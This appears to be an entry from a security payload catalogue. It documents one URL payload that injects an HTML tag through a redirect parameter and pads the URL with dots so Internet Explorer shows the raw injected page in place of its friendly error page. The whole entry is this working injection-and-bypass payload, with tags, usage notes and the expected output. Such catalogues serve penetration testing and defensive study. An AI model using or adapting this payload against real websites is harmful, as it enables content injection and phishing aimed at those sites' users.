---
id: cmd-ie-padded-url
data: >-
  http://secgeek.net/POC/redir.php?x=https://sms-be-vip.twitter.com/<h1>TEST</h1>....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
tags:
  - padding
  - bypass
type: command
output: null
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.781Z'
verified: false
validated: true
submitted: true
---
# ie-padded-html-url

## Command

```url
http://secgeek.net/POC/redir.php?x=https://sms-be-vip.twitter.com/<h1>TEST</h1>....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
```

## Description

Padded URL for IE to bypass friendly error pages by exceeding response size threshold, showing raw injected HTML.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `x` | Padded target URL | Yes |

## Examples

### Basic Usage

Enter in IE to see raw 404.

### Advanced Usage

Adjust dots for exact length.

## Expected Output

Raw 404 with visible HTML injection, no IE overlay.

## Related

- [[procedures/Pad-URL-to-Bypass-IE-Friendly-Errors]]
